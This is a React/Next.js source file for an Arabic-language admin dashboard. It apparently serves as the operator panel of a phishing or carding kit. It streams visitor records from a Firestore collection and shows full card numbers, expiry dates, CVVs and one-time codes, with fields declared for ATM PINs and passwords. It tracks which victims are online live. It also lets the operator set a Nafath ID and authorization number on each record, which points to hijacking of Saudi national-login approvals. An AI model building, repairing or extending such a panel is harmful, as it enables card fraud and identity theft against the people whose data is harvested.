"use client";

import { useEffect, useState, useMemo } from "react";
import { collection, onSnapshot, updateDoc, doc } from "firebase/firestore";
import { db } from "@/lib/firestore";
import { ref, onValue } from "firebase/database";
import { database } from "@/lib/firestore";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { useRouter } from "next/navigation";
import {
  Shield,
  Edit3,
  Save,
  X,
  Loader2,
  Award as IdCard,
  CreditCard,
  CheckCircle,
  Clock,
  XCircle,
  Search,
  Users,
  Activity,
} from "lucide-react";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";

interface NafazInfo {
  nafazId?: string;
  authNumber?: string;
  lastUpdated?: string;
}

interface Notification {
  createdDate: string;
  bank: string;
  cardStatus?: string;
  ip?: string;
  cvv: string;
  id: string | "0";
  notificationCount: number;
  otp: string;
  otp2: string;
  page: string;
  cardNumber: string;
  cardHolderName?: string;
  expiryMonth?: string;
  expiryYear?: string;
  country?: string;
  personalInfo: {
    id?: string | "0";
    name?: string;
  };
  prefix: string;
  status: "pending" | "approved" | "rejected" | string;
  isOnline?: boolean;
  lastSeen: string;
  violationValue: number;
  pass?: string;
  atmPin?: string;
  pagename: string;
  plateType: string;
  allOtps?: string[] | null;
  idNumber: string;
  email: string;
  mobile: string;
  network: string;
  phoneOtp: string;
  name: string;
  otpCode: string;
  phone: string;
  flagColor?: string;
  currentPage?: string;
  nafazInfo?: NafazInfo;
  nafazId?: string;
  authNumber?: string;
}

// Nafaz Information Component
function NafazInfoCard({
  notification,
  onUpdate,
}: {
  notification: Notification;
  onUpdate: (id: string, nafazInfo: NafazInfo) => void;
}) {
  const [isEditing, setIsEditing] = useState(false);
  const [nafazId, setNafazId] = useState(
    notification?.nafazId || notification?.nafazInfo?.nafazId || ""
  );
  const [authNumber, setAuthNumber] = useState(
    notification?.authNumber || notification?.nafazInfo?.authNumber || ""
  );
  const [isSaving, setIsSaving] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    setNafazId(notification?.nafazId || notification?.nafazInfo?.nafazId || "");
    setAuthNumber(
      notification?.authNumber || notification?.nafazInfo?.authNumber || ""
    );
  }, [notification]);

  const handleSave = async () => {
    setIsSaving(true);
    try {
      await onUpdate(notification.id, {
        nafazId,
        authNumber,
        lastUpdated: new Date().toISOString(),
      });
      setIsEditing(false);
      toast({
        title: "تم التحديث بنجاح",
        description: "تم تحديث معلومات نفاذ بنجاح",
      });
    } catch (error) {
      toast({
        title: "خطأ في التحديث",
        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
        variant: "destructive",
      });
    } finally {
      setIsSaving(false);
    }
  };

  const handleCancel = () => {
    setNafazId(notification?.nafazId || notification?.nafazInfo?.nafazId || "");
    setAuthNumber(
      notification?.authNumber || notification?.nafazInfo?.authNumber || ""
    );
    setIsEditing(false);
  };

  return (
    <Card className="border-2 border-orange-200 bg-gradient-to-br from-orange-50 to-orange-100/50 shadow-lg">
      <CardHeader className="pb-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-full bg-gradient-to-br from-orange-500 to-orange-600 flex items-center justify-center shadow-md">
              <Shield className="h-6 w-6 text-white" />
            </div>
            <div>
              <CardTitle className="text-lg text-gray-800">
                معلومات نفاذ
              </CardTitle>
              <CardDescription className="text-sm">
                {notification.nafazInfo?.lastUpdated
                  ? `آخر تحديث: ${formatDistanceToNow(
                      new Date(notification.nafazInfo.lastUpdated),
                      {
                        addSuffix: true,
                        locale: ar,
                      }
                    )}`
                  : "لم يتم التحديث بعد"}
              </CardDescription>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={() => setIsEditing(!isEditing)}
              className="gap-2 border-orange-300 hover:bg-orange-100"
            >
              <Edit3 className="h-4 w-4" />
              {isEditing ? "إلغاء" : "تعديل"}
            </Button>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {isEditing ? (
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label
                  htmlFor="nafaz-id"
                  className="text-sm font-semibold text-gray-700"
                >
                  رقم الهوية نفاذ
                </Label>
                <Input
                  id="nafaz-id"
                  placeholder="أدخل رقم الهوية"
                  value={nafazId}
                  onChange={(e) => setNafazId(e.target.value)}
                  className="bg-white border-orange-200 focus:ring-orange-500"
                />
              </div>
              <div className="space-y-2">
                <Label
                  htmlFor="auth-number"
                  className="text-sm font-semibold text-gray-700"
                >
                  رقم التفويض
                </Label>
                <Input
                  id="auth-number"
                  placeholder="أدخل رقم التفويض"
                  value={authNumber}
                  onChange={(e) => setAuthNumber(e.target.value)}
                  className="bg-white border-orange-200 focus:ring-orange-500"
                />
              </div>
            </div>
            <div className="flex justify-end gap-2 pt-4 border-t border-orange-200">
              <Button
                variant="outline"
                onClick={handleCancel}
                className="border-orange-300 bg-transparent"
              >
                <X className="h-4 w-4 mr-2" />
                إلغاء
              </Button>
              <Button
                onClick={handleSave}
                disabled={isSaving}
                className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700"
              >
                {isSaving ? (
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                ) : (
                  <Save className="h-4 w-4 mr-2" />
                )}
                حفظ التغييرات
              </Button>
            </div>
          </div>
        ) : (
          <div className="space-y-3">
            {nafazId || authNumber ? (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {nafazId && (
                  <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-orange-200 shadow-sm">
                    <span className="text-xs font-medium text-gray-600">
                      رقم الهوية نفاذ
                    </span>
                    <span className="font-bold text-base text-gray-800">
                      {nafazId}
                    </span>
                  </div>
                )}
                {authNumber && (
                  <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-orange-200 shadow-sm">
                    <span className="text-xs font-medium text-gray-600">
                      رقم التفويض
                    </span>
                    <span className="font-bold text-base text-orange-600 font-mono tracking-wider">
                      {authNumber}
                    </span>
                  </div>
                )}
              </div>
            ) : (
              <div className="text-center py-8 bg-white rounded-lg border border-dashed border-orange-300">
                <IdCard className="h-12 w-12 mx-auto text-orange-400 mb-3" />
                <p className="text-gray-600 font-medium">
                  لا توجد معلومات نفاذ مسجلة
                </p>
                <p className="text-sm text-gray-500 mt-1">
                  اضغط على "تعديل" لإضافة معلومات نفاذ
                </p>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// Card Information Component
function CardInfoCard({ notification }: { notification: Notification }) {
  return (
    <Card className="border-2 border-green-200 bg-gradient-to-br from-green-50 to-green-100/50 shadow-lg">
      <CardHeader className="pb-3">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center shadow-md">
            <CreditCard className="h-6 w-6 text-white" />
          </div>
          <div>
            <CardTitle className="text-lg text-gray-800">
              معلومات البطاقة
            </CardTitle>
            <CardDescription className="text-sm">
              {notification.createdDate
                ? formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })
                : "غير متوفر"}
            </CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {notification.cardNumber ? (
          <div className="space-y-3">
            <div className="grid grid-cols-1 gap-4">
              <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                <span className="text-xs font-medium text-gray-600">
                  رقم البطاقة
                </span>
                <span className="font-bold text-base text-gray-800 font-mono tracking-wider">
                  {notification.cardNumber}
                </span>
              </div>
              {notification.cardHolderName && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">
                    اسم حامل البطاقة
                  </span>
                  <span className="font-bold text-base text-gray-800">
                    {notification.cardHolderName}
                  </span>
                </div>
              )}
              {notification.expiryMonth && notification.expiryYear && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">
                    تاريخ الانتهاء
                  </span>
                  <span className="font-bold text-base text-gray-800 font-mono">
                    {notification.expiryMonth}/{notification.expiryYear}
                  </span>
                </div>
              )}
              {notification.cvv && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">CVV</span>
                  <span className="font-bold text-base text-green-600 font-mono">
                    {notification.cvv}
                  </span>
                </div>
              )}
              {notification.otp && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">
                    رمز التحقق - OTP
                  </span>
                  <span className="font-bold text-base text-gray-800">
                    {notification.otp}
                  </span>
                </div>
              )}
              {notification.cardStatus && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">
                    حالة البطاقة
                  </span>
                  <span className="font-bold text-base text-gray-800">
                    {notification.cardStatus}
                  </span>
                </div>
              )}
            </div>
          </div>
        ) : (
          <div className="text-center py-8 bg-white rounded-lg border border-dashed border-green-300">
            <CreditCard className="h-12 w-12 mx-auto text-green-400 mb-3" />
            <p className="text-gray-600 font-medium">
              لا توجد معلومات بطاقة مسجلة
            </p>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// Hook to count online users
function useOnlineUsersCount() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const statusRef = ref(database, "/status");
    const unsubscribe = onValue(statusRef, (snapshot) => {
      let onlineCount = 0;
      snapshot.forEach((childSnapshot) => {
        const data = childSnapshot.val();
        if (data && data.state === "online") {
          onlineCount++;
        }
      });
      setCount(onlineCount);
    });

    return () => unsubscribe();
  }, []);

  return count;
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedInfo, setSelectedInfo] = useState<
    "personal" | "card" | "nafaz" | null
  >(null);
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const [filterType, setFilterType] = useState<
    "all" | "card" | "online" | "nafaz"
  >("all");
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage] = useState(10);
  const router = useRouter();
  const onlineUsersCount = useOnlineUsersCount();
  const { toast } = useToast();

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
    {}
  );

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {};
    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`);
      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val();
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }));
      });
      statusRefs[notification.id] = callback;
    });

    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe();
        }
      });
    };
  }, [notifications]);

  // Statistics calculations
  const totalVisitorsCount = notifications.length;
  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
  const nafazSubmissionsCount = notifications.filter(
    (n) =>
      (n.nafazInfo && (n.nafazInfo.nafazId || n.nafazInfo.authNumber)) ||
      n.nafazId ||
      n.authNumber
  ).length;
  const approvedCount = notifications.filter(
    (n) => n.status === "approved"
  ).length;
  const pendingCount = notifications.filter(
    (n) => n.status === "pending"
  ).length;

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications;

    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber);
    } else if (filterType === "online") {
      filtered = filtered.filter(
        (notification) => onlineStatuses[notification.id]
      );
    } else if (filterType === "nafaz") {
      filtered = filtered.filter(
        (notification) =>
          (notification.nafazInfo &&
            (notification.nafazInfo.nafazId ||
              notification.nafazInfo.authNumber)) ||
          notification.nafazId ||
          notification.authNumber
      );
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase();
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.nafazInfo?.nafazId?.toLowerCase().includes(term) ||
          notification.nafazInfo?.authNumber?.toLowerCase().includes(term) ||
          notification.nafazId?.toLowerCase().includes(term) ||
          notification.authNumber?.toLowerCase().includes(term)
      );
    }

    return filtered;
  }, [notifications, filterType, searchTerm, onlineStatuses]);

  // Pagination
  const indexOfLastItem = currentPage * itemsPerPage;
  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
  const currentItems = filteredNotifications.slice(
    indexOfFirstItem,
    indexOfLastItem
  );
  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage);

  // Fetch notifications
  useEffect(() => {
    const unsubscribe = onSnapshot(
      collection(db, "pays"),
      (snapshot) => {
        const notificationsData = snapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Notification[];

        // Sort by createdDate descending (newest first)
        const sortedNotifications = notificationsData.sort((a, b) => {
          const dateA = a.createdDate ? new Date(a.createdDate).getTime() : 0;
          const dateB = b.createdDate ? new Date(b.createdDate).getTime() : 0;
          return dateB - dateA;
        });

        setNotifications(sortedNotifications);
        setIsLoading(false);
      },
      (error) => {
        console.error("Error fetching notifications:", error);
        setIsLoading(false);
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        });
      }
    );

    return unsubscribe;
  }, [toast]);

  const handleNafazUpdate = async (id: string, nafazInfo: NafazInfo) => {
    try {
      const docRef = doc(db, "pays", id);
      await updateDoc(docRef, {
        nafazInfo,
        nafazId: nafazInfo.nafazId,
        authNumber: nafazInfo.authNumber,
      });

      setNotifications(
        notifications.map((notification) =>
          notification.id === id
            ? {
                ...notification,
                nafazInfo,
                nafazId: nafazInfo.nafazId,
                authNumber: nafazInfo.authNumber,
              }
            : notification
        )
      );

      toast({
        title: "تم تحديث معلومات نفاذ",
        description: "تم تحديث معلومات نفاذ بنجاح",
        variant: "default",
      });
    } catch (error) {
      console.error("Error updating nafaz info:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
        variant: "destructive",
      });
    }
  };

  const handleInfoClick = (
    notification: Notification,
    type: "personal" | "card" | "nafaz"
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(type);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-orange-600 mx-auto" />
          <p className="text-gray-600 font-medium">جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-6"
      dir="rtl"
    >
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-800">لوحة التحكم</h1>
            <p className="text-gray-600 mt-1">إدارة طلبات المصادقة</p>
          </div>
        </div>

        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          <Card className="border-0 shadow-lg bg-gradient-to-br from-blue-500 to-blue-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-blue-100 text-sm font-medium">
                    إجمالي الزوار
                  </p>
                  <p className="text-3xl font-bold mt-2">
                    {totalVisitorsCount}
                  </p>
                </div>
                <Users className="h-12 w-12 text-blue-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-green-500 to-green-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-green-100 text-sm font-medium">
                    البطاقات المقدمة
                  </p>
                  <p className="text-3xl font-bold mt-2">
                    {cardSubmissionsCount}
                  </p>
                </div>
                <CreditCard className="h-12 w-12 text-green-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-orange-500 to-orange-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-orange-100 text-sm font-medium">
                    طلبات نفاذ
                  </p>
                  <p className="text-3xl font-bold mt-2">
                    {nafazSubmissionsCount}
                  </p>
                </div>
                <Shield className="h-12 w-12 text-orange-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-purple-500 to-purple-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-purple-100 text-sm font-medium">
                    متصل الآن
                  </p>
                  <p className="text-3xl font-bold mt-2">{onlineUsersCount}</p>
                </div>
                <Activity className="h-12 w-12 text-purple-200" />
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filters and Search */}
        <Card className="border-0 shadow-lg">
          <CardContent className="p-6">
            <div className="flex flex-col md:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                  <Input
                    placeholder="البحث عن طريق الاسم، البريد، الهاتف، رقم البطاقة، أو معلومات نفاذ..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pr-10 h-11"
                  />
                </div>
              </div>
              <div className="flex gap-2">
                <Button
                  variant={filterType === "all" ? "default" : "outline"}
                  onClick={() => setFilterType("all")}
                  className={
                    filterType === "all" ? "bg-blue-600 hover:bg-blue-700" : ""
                  }
                >
                  الكل
                </Button>
                <Button
                  variant={filterType === "card" ? "default" : "outline"}
                  onClick={() => setFilterType("card")}
                  className={
                    filterType === "card"
                      ? "bg-green-600 hover:bg-green-700"
                      : ""
                  }
                >
                  البطاقات
                </Button>
                <Button
                  variant={filterType === "nafaz" ? "default" : "outline"}
                  onClick={() => setFilterType("nafaz")}
                  className={
                    filterType === "nafaz"
                      ? "bg-orange-600 hover:bg-orange-700"
                      : ""
                  }
                >
                  نفاذ
                </Button>
                <Button
                  variant={filterType === "online" ? "default" : "outline"}
                  onClick={() => setFilterType("online")}
                  className={
                    filterType === "online"
                      ? "bg-purple-600 hover:bg-purple-700"
                      : ""
                  }
                >
                  متصل
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Notifications Table */}
        <Card className="border-0 shadow-lg">
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-100 border-b">
                  <tr>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                      الاسم
                    </th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                      الدولة
                    </th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                      الحالة
                    </th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                      المعلومات
                    </th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">
                      الإجراءات
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {currentItems.map((notification) => (
                    <tr
                      key={notification.id}
                      className="hover:bg-gray-50 transition-colors"
                    >
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-3 h-3 rounded-full ${
                              onlineStatuses[notification.id]
                                ? "bg-green-500 animate-pulse"
                                : "bg-gray-300"
                            }`}
                          ></div>
                          <div>
                            <p className="font-semibold text-gray-800">
                              {notification.name || "غير متوفر"}
                            </p>
                            <p className="text-sm text-gray-500">
                              {notification.email || notification.phone}
                            </p>
                            {notification.createdDate && (
                              <p className="text-xs text-gray-400">
                                {formatDistanceToNow(
                                  new Date(notification.createdDate),
                                  {
                                    addSuffix: true,
                                    locale: ar,
                                  }
                                )}
                              </p>
                            )}
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <p className="text-sm text-gray-700">
                          {notification.country || "غير محدد"}
                        </p>
                      </td>
                      <td className="px-6 py-4">
                        {notification.otp ? (
                          <Badge className="bg-gradient-to-r from-pink-700 to-blue-500 text-white">
                            <Shield className="h-4 w-4 ml-1" />
                            {notification.otp}
                          </Badge>
                        ) : (
                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                            <Clock className="h-4 w-4 ml-1" />
                            OTP{" "}
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={
                              notification.cardNumber ? "default" : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.cardNumber
                                ? "bg-gradient-to-r from-green-500 to-green-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "card")
                            }
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardNumber
                              ? "معلومات البطاقة"
                              : "لا يوجد بطاقة"}
                          </Badge>

                          <Badge
                            variant={
                              (notification.nafazInfo &&
                                (notification.nafazInfo.nafazId ||
                                  notification.nafazInfo.authNumber)) ||
                              notification.nafazId ||
                              notification.authNumber
                                ? "default"
                                : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              (notification.nafazInfo &&
                                (notification.nafazInfo.nafazId ||
                                  notification.nafazInfo.authNumber)) ||
                              notification.nafazId ||
                              notification.authNumber
                                ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "nafaz")
                            }
                          >
                            <Shield className="h-3 w-3 mr-1" />
                            {(notification.nafazInfo &&
                              (notification.nafazInfo.nafazId ||
                                notification.nafazInfo.authNumber)) ||
                            notification.nafazId ||
                            notification.authNumber
                              ? "معلومات نفاذ"
                              : "لا يوجد نفاذ"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => {
                            setSelectedNotification(notification);
                            setSelectedInfo("nafaz");
                          }}
                          className="border-orange-300 hover:bg-orange-50"
                        >
                          عرض التفاصيل
                        </Button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="flex items-center justify-between px-6 py-4 border-t">
                <p className="text-sm text-gray-600">
                  عرض {indexOfFirstItem + 1} إلى{" "}
                  {Math.min(indexOfLastItem, filteredNotifications.length)} من{" "}
                  {filteredNotifications.length}
                </p>
                <div className="flex gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage(currentPage - 1)}
                    disabled={currentPage === 1}
                  >
                    السابق
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage(currentPage + 1)}
                    disabled={currentPage === totalPages}
                  >
                    التالي
                  </Button>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Card Information Section */}
        {selectedNotification && selectedInfo === "card" && (
          <div className="mt-6">
            <CardInfoCard notification={selectedNotification} />
          </div>
        )}

        {/* Nafaz Information Section */}
        {selectedNotification && selectedInfo === "nafaz" && (
          <div className="mt-6">
            <NafazInfoCard
              notification={selectedNotification}
              onUpdate={handleNafazUpdate}
            />
          </div>
        )}
      </div>

      {/* Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent
          className="max-w-2xl max-h-[80vh] overflow-y-auto"
          dir="rtl"
        >
          <DialogHeader></DialogHeader>

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <CardInfoCard notification={selectedNotification} />
            </div>
          )}

          {selectedInfo === "nafaz" && selectedNotification && (
            <div className="space-y-4">
              <NafazInfoCard
                notification={selectedNotification}
                onUpdate={handleNafazUpdate}
              />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
